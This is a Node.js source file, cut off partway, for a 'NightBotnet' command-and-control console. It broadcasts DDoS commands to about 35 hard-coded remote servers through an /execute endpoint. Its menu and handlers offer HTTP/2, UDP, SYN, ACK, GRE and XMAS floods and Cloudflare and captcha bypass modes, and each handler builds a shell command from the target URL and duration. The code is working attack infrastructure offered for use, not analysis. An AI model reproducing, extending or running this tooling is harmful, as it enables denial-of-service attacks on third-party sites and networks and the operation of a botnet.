const readline = require('readline');
const axios = require('axios');
const chalk = require('chalk');
const moment = require('moment');

// Server configuration
const SERVERS = [
    { name: 'API', url: 'https://8196-idx-api-1743713659269.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713675480.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713681159.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713685108.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713689643.cluster-w5vd22whf5gmav2vgkomwtc4go.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713979789.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713985342.cluster-ikxjzjhlifcwuroomfkjrx437g.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713990531.cluster-zkm2jrwbnbd4awuedc2alqxrpk.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713995162.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743713998948.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714304672.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714308860.cluster-bec2e4635ng44w7ed22sa22hes.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714313368.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714317371.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714322115.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714682733.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714686346.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714690173.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714694113.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743714698518.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715011244.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715015182.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715019071.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715022649.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715028358.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715353865.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715358955.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715362082.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715366913.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715371288.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715879125.cluster-ancjwrkgr5dvux4qug5rbzyc2y.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715883987.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715888252.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715892932.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev' },
    { name: 'API', url: 'https://8196-idx-api-1743715897323.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev' },
];

// Gradient pink colors
const pinkGradient = [
    '#FFC0CB', // Light Pink
    '#FFB6C1', // LightPink
    '#FF69B4', // HotPink
    '#FF1493', // DeepPink
    '#DB7093'  // PaleVioletRed
];

// Function to create gradient text
function gradientText(text, colors) {
    const segmentLength = Math.ceil(text.length / (colors.length - 1));
    let result = '';
    for (let i = 0; i < text.length; i++) {
        const segment = Math.min(Math.floor(i / segmentLength), colors.length - 2);
        const ratio = (i % segmentLength) / segmentLength;
        const color = interpolateColor(colors[segment], colors[segment + 1], ratio);
        result += chalk.hex(color)(text[i]);
    }
    return result;
}

// Helper function to interpolate between two hex colors
function interpolateColor(color1, color2, ratio) {
    const r1 = parseInt(color1.substring(1, 3), 16);
    const g1 = parseInt(color1.substring(3, 5), 16);
    const b1 = parseInt(color1.substring(5, 7), 16);
    const r2 = parseInt(color2.substring(1, 3), 16);
    const g2 = parseInt(color2.substring(3, 5), 16);
    const b2 = parseInt(color2.substring(5, 7), 16);

    const r = Math.round(r1 + (r2 - r1) * ratio);
    const g = Math.round(g1 + (g2 - g1) * ratio);
    const b = Math.round(b1 + (b2 - b1) * ratio);

    return `#${((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1)}`;
}

class BroadcastTerminal {
    constructor() {
        this.activeBroadcasts = [];
        this.lastBroadcastTime = null;
        this.lastConcurrentMaxReached = null;
        this.MAX_DURATION = 600;
        this.COOLDOWN_DURATION = 0;
        this.MAX_CONCURRENT_ATTACKS = 3;
        this.CONCURRENT_COOLDOWN = 60;

        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: gradientText('[root@NightBotnet] => ', pinkGradient)
        });

        this.init();
    }

    init() {
        console.clear();
        console.log(gradientText(`
         ,MMM8&&&.
    _...MMMMM88&&&&..._
 .::'''MMMMM88&&&&&&'''::.
::     MMMMM88&&&&&&     ::
'::....MMMMM88&&&&&&....::'
   ''''MMMMM88&&&&''''
         'MMM8&&&'`, pinkGradient));
        console.log(chalk.hex('#FF69B4')('\nHello root, Welcome to NightBotnet'));
        console.log(chalk.hex('#FFB6C1')('Type "?" or "help" to start.\n'));

        this.rl.prompt();

        this.rl.on('line', async (line) => {
            const [command, ...args] = line.trim().toLowerCase().split(' ');

            try {
                switch(command) {
                    case 'help':
                    case '?':
                        this.showHelp();
                        break;
                    case 'h2-glacier':
                        await this.glacier(args);
                        break;
                        case 'h2-rapid':
                        await this.rapid(args);
                        break;
                        case 'h2-mize':
                        await this.mize(args);
                        break;
                        case 'h2-get':
                         await this.get(args);
                        break;
                    case 'udp':
                        await this.udp(args);
                        break;
                        case 'udpplain':
                        await this.udpplain(args);
                        break;
                        case 'syn':
                        await this.syn(args);
                        break;
                        case 'ack':
                        await this.ack(args);
                        break;
                        case 'greeth':
                        await this.greeth(args);
                        break;
                        case 'greip':
                        await this.greip(args);
                        break;
                        case 'xmas':
                        await this.xmas(args);
                        break;
                        case 'stdhex':
                        await this.stdhex(args);
                        break;
                    case 'cloudflare':
                        await this.executeBypassCommand(args);
                        break;
                    case 'h1-adonis':
                        await this.adonis(args);
                        break;
                        case 'h2-moon':
                        await this.moon(args);
                        break;
                        case 'static':
                        await this.static(args);
                        break;
                        case 'browser':
                        await this.browser(args);
                        break;
                    case 'tlsx':
                        await this.executeTlsCommand(args);
                        break;
                    case 'ongoing':
                        this.checkOngoingBroadcasts();
                        break;
                    case 'sandi':
                        await this.checkServerStatus();
                        break;
                    case 'config':
                        this.showConfig(args);
                        break;
                    case 'clear':
                        case 'cls':
                        console.clear();
                        break;
                    case 'exit':
                        this.rl.close();
                        return;
                    default:
                        console.log(chalk.hex('#FF1493')(`Unknown command: ${command}`));
                        console.log(chalk.hex('#FF69B4')('Type "help" for available commands'));
                }
            } catch (error) {
                console.log(chalk.hex('#FF1493')(`Error executing command: ${error.message}`));
            }

            this.rl.prompt();
        }).on('close', () => {
            console.log(chalk.hex('#FF1493')('\nExiting Broadcast Terminal...'));
            process.exit(0);
        });
    }

    showHelp() {
        // L7 BASIC
        console.log(chalk.hex('#FF1493').bold('[ L7 BASIC ]'));
        console.log(chalk.hex('#FFB6C1')('~ !h2-glacier: High http2 rps DONT HAVE ANY BYPASS'));
        console.log(chalk.hex('#FFB6C1')('~ !h2-rapid: High rps, reset rapidly made 583 ERROR'));
        console.log(chalk.hex('#FFB6C1')('~ !h2-mize: Come with optimized request/s DONT HAVE GOOD BYPASS'));
        console.log(chalk.hex('#FFB6C1')('~ !h2-get: Http2 get flooder, High rps and have some bypass\n'));

        // L7 VIP
        console.log(chalk.hex('#FF1493').bold('[ L7 VIP ]'));
        console.log(chalk.hex('#FFB6C1')('~ !h1-adonis: Http raw socket flood with Http1'));
        console.log(chalk.hex('#FFB6C1')('~ !h2-moon: Come with high rps and good bypass for UAN'));
        console.log(chalk.hex('#FFB6C1')('~ !cloudflare: Made for bypassing cloudflare anti http ddos'));
        console.log(chalk.hex('#FFB6C1')('~ !static: Sending big payload HTTP2 and high traffic with POST method'));
        console.log(chalk.hex('#FFB6C1')('~ !tlsx: Made for bypassing 0% http ddos, with advanced bypass technology'));
        console.log(chalk.hex('#FFB6C1')('~ !browser: Emulating browser to bypass cloudflare captcha, interactive challenge, Turnstile\n'));

        // BOTNET VIP
        console.log(chalk.hex('#FF1493').bold('[ BOTNET VIP ]'));
        console.log(chalk.hex('#FFB6C1')('~ !udp: High Gb/s flood with udp, using botnet'));
        console.log(chalk.hex('#FFB6C1')('~ !udpplain: UDP flood with less options. optimized for higher PPS'));
        console.log(chalk.hex('#FFB6C1')('~ !syn: Top syn flood optimized for stable flood'));
        console.log(chalk.hex('#FFB6C1')('~ !ack: Top ack flood, made for high pps and GBPS'));
        console.log(chalk.hex('#FFB6C1')('~ !greeth: GRE ethernet flood'));
        console.log(chalk.hex('#FFB6C1')('~ !greip: GRE IP flood'));
        console.log(chalk.hex('#FFB6C1')('~ !xmas: XMAS flood'));
        console.log(chalk.hex('#FFB6C1')('~ !stdhex: Udp hex flood, Bypassing OVM\n'));
    }

    showConfig(args) {
        if (args.length === 0) {
            console.log(gradientText('\n=== Current Configuration ===', pinkGradient));
            console.log(chalk.hex('#FFC0CB')(`Max Attack Duration: ${this.MAX_DURATION} seconds`));
            console.log(chalk.hex('#FFC0CB')(`Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
            console.log(chalk.hex('#FFC0CB')(`Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
            console.log(chalk.hex('#FFC0CB')(`Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));
            return;
        }

        if (args[0] === 'set' && args.length === 3) {
            const [_, parameter, value] = args;
            const numValue = parseInt(value);

            if (isNaN(numValue)) {
                console.log(chalk.hex('#FF1493')('Value must be a number'));
                return;
            }

            switch(parameter) {
                case 'max_duration':
                    this.MAX_DURATION = numValue;
                    console.log(chalk.hex('#FF69B4')(`Max Attack Duration set to ${numValue} seconds`));
                    break;
                case 'cooldown':
                    this.COOLDOWN_DURATION = numValue;
                    console.log(chalk.hex('#FF69B4')(`Cooldown Period set to ${numValue} seconds`));
                    break;
                case 'max_concurrent':
                    this.MAX_CONCURRENT_ATTACKS = numValue;
                    console.log(chalk.hex('#FF69B4')(`Max Concurrent Attacks set to ${numValue}`));
                    break;
                case 'concurrent_cooldown':
                    this.CONCURRENT_COOLDOWN = numValue;
                    console.log(chalk.hex('#FF69B4')(`Concurrent Cooldown set to ${numValue} seconds`));
                    break;
                default:
                    console.log(chalk.hex('#FF1493')(`Unknown parameter: ${parameter}`));
                    console.log(chalk.hex('#FFB6C1')('Available parameters: max_duration, cooldown, max_concurrent, concurrent_cooldown'));
            }
        } else {
            console.log(chalk.hex('#FF1493')('Invalid configuration command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: config set [parameter] [value]'));
            console.log(chalk.hex('#FFB6C1')('Available parameters: max_duration, cooldown, max_concurrent, concurrent_cooldown'));
        }
    }

    checkCooldownAndConcurrency() {
        const now = moment();

        this.activeBroadcasts = this.activeBroadcasts.filter(broadcast => 
            now.isBefore(broadcast.endTime)
        );

        if (this.activeBroadcasts.length >= this.MAX_CONCURRENT_ATTACKS) {
            if (!this.lastConcurrentMaxReached) {
                this.lastConcurrentMaxReached = now;
            }
            console.log(chalk.hex('#FF1493')(`Maximum concurrent attacks (${this.MAX_CONCURRENT_ATTACKS}) reached.`));
            return false;
        }

        if (this.lastConcurrentMaxReached) {
            const concurrentCooldownRemaining = this.CONCURRENT_COOLDOWN - now.diff(this.lastConcurrentMaxReached, 'seconds');
            if (concurrentCooldownRemaining > 0) {
                console.log(chalk.hex('#FF1493')(`Concurrent cooldown active. Please wait ${concurrentCooldownRemaining} seconds after max concurrent limit was reached.`));
                return false;
            }
            this.lastConcurrentMaxReached = null;
        }

        if (this.lastBroadcastTime) {
            const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
            if (cooldownRemaining > 0) {
                console.log(chalk.hex('#FF1493')(`Cooldown active. Please wait ${cooldownRemaining} seconds.`));
                return false;
            }
        }

        return true;
    }

    checkDuration(time) {
        if (parseInt(time) > this.MAX_DURATION) {
            console.log(chalk.hex('#FF1493')(`Attack duration cannot exceed ${this.MAX_DURATION} seconds.`));
            return false;
        }
        return true;
    }

    async broadcastCommandToServers(command) {
        const results = await Promise.all(SERVERS.map(async (server) => {
            try {
                const response = await axios.post(server.url + '/execute', { command }, {
                    timeout: 10000
                });

                return {
                    server: server.url,
                    status: 'Success',
                    response: response.data
                };
            } catch (error) {
                return {
                    server: server.url,
                    status: 'Failed',
                    error: error.message
                };
            }
        }));

        return results;
    }

    displayBroadcastResults(results) {
        const successCount = results.filter(r => r.status === 'Success').length;
        const failureCount = results.filter(r => r.status === 'Failed').length;

        results.forEach(result => {
            if (result.status === 'Success') {
            }
        });
    }

    async checkServerStatus() {
        console.log(gradientText('\n⎯⎯⎯⎯⎯Checking Server Status⎯⎯⎯⎯⎯', pinkGradient));

        for (const server of SERVERS) {
            try {
                const startTime = Date.now();
                const response = await axios.get(server.url + '/status', { timeout: 5000 });
                const latency = Date.now() - startTime;

                console.log(chalk.hex('#FFC0CB')(`  Status   : Online`));
                console.log(chalk.hex('#FFC0CB')(`  Latency  : ${latency}ms`));
                console.log(chalk.hex('#FFC0CB')(`  Response : ${JSON.stringify(response.data)}\n`));
            } catch (error) {
                console.log(chalk.hex('#FF1493')(`Server: ${server.url}`));
                console.log(chalk.hex('#FF1493')(`  Status   : Offline`));
                console.log(chalk.hex('#FF1493')(`  Error    : ${error.message}\n`));
            }
        }
    }

    async executeMixCommand(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for mix command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: mix.js [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node mix.js ${url} ${time} 1 1`;

        console.log(gradientText('\n=== Reaction Details ===', pinkGradient));
        console.log(chalk.hex('#FF69B4')(`Target URL     : ${url}`));
        console.log(chalk.hex('#FF69B4')(`Time           : ${time} seconds`));
        console.log(chalk.hex('#FF69B4')(`Method         : h2-glacier`));
        console.log(chalk.hex('#FF69B4')(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
        console.log(chalk.hex('#FF69B4')(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));

        console.log(chalk.hex('#DB7093')('\nAttack has launched. Broadcast to all servers.. done'));

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'MIX',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h2-glacier command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async glacier(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for h2-glacier command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: h2-glacier [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node mix.js ${url} ${time} 1 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');

        console.log(`
    Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mh2-glacier\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
    Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'h2-glacier',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h2-glacier command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async rapid(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for h2-rapid command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: h2-rapid [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node mix.js ${url} ${time} 1 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');

        console.log(`
    Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mh2-rapid\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
    Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'h2-rapid',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h2-rapid command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async mize(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for h2-mize command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: h2-mize [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node mix.js ${url} ${time} 1 1`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');

        console.log(`
    Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m443\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mh2-mize\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
    Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'h2-mize',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h2-mize command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async get(args) {
        if (args.length !== 2) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for h2-get command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: h2-get [url] [time]'));
            return;
        }

        const [url, time] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node mix.js ${url} ${time} 1 1`;

        // Clean reaction display format
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
    Attack Details:
    Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
    Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
    Target:      [ \x1b[34m${url}\x1b[0m ]
    Port:        [ \x1b[34m443\x1b[0m ]
    Attack Time: [ \x1b[34m${time}\x1b[0m ]
    Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
    Threads:     [ \x1b[34m90/100\x1b[0m ]
    Methods:     [ \x1b[31mh2-get\x1b[0m ]
    Network VIP  [ \x1b[32mtrue\x1b[0m ]
    Total Bots   [ \x1b[34m40\x1b[0m ]
    Target Details:
    ASN:         [ \x1b[34m87003\x1b[0m ]
    ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
    ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'h2-get',
            url: url,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            // Optional: Add server response display if needed
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('h2-get command broadcast failed:', error.message));
        }
    }
    //=========================================================
    // UDP Attack Method
    async udp(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for udp command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: udp [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mudp\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'udp',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('UDP command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async udpplain(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for udpplain command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: udpplain [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31mudpplain\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'udpplain',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('udpplain command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async syn(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for syn command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: syn [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
        const formattedTime = currentDateTime.format('MMM DD YYYY HH:mm:ss');
        console.log(`
        Attack Details:
        Status:      [ \x1b[32mAttack Sent Successfully To All Servers\x1b[0m ]
        Attack By:   [ \x1b[31m@mrtanjiro\x1b[0m ]
        Target:      [ \x1b[34m${url}\x1b[0m ]
        Port:        [ \x1b[34m${port}\x1b[0m ]
        Attack Time: [ \x1b[34m${time}\x1b[0m ]
        Date Started:[ \x1b[34m${formattedTime}\x1b[0m ]
        Threads:     [ \x1b[34m90/100\x1b[0m ]
        Methods:     [ \x1b[31msyn\x1b[0m ]
        Network VIP  [ \x1b[32mtrue\x1b[0m ]
        Total Bots   [ \x1b[34m40\x1b[0m ]
        Target Details:
        ASN:         [ \x1b[34m87003\x1b[0m ]
        ISP:         [ \x1b[34mCloudflare Inc.\x1b[0m ]
        ORG:         [ \x1b[34mCanada\x1b[0m ]
        `);

        this.lastBroadcastTime = currentDateTime;
        this.activeBroadcasts.push({
            type: 'syn',
            url: url,
            port: port,
            startTime: currentDateTime,
            endTime: endTime,
            duration: parseInt(time)
        });

        try {
            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
            this.displayBroadcastResults(broadcastResults);
        } catch (error) {
            console.log(chalk.hex('#FF1493')('syn command broadcast failed:', error.message));
        }
    }
    //=========================================================
    async ack(args) {
        if (args.length !== 3) {
            console.log(chalk.hex('#FF1493')('Invalid arguments for ack command.'));
            console.log(chalk.hex('#FFB6C1')('Usage: ack [url] [time] [port]'));
            return;
        }

        const [url, time, port] = args;

        if (!this.checkDuration(time)) return;
        if (!this.checkCooldownAndConcurrency()) return;

        const currentDateTime = moment();
        const endTime = moment().add(parseInt(time), 'seconds');
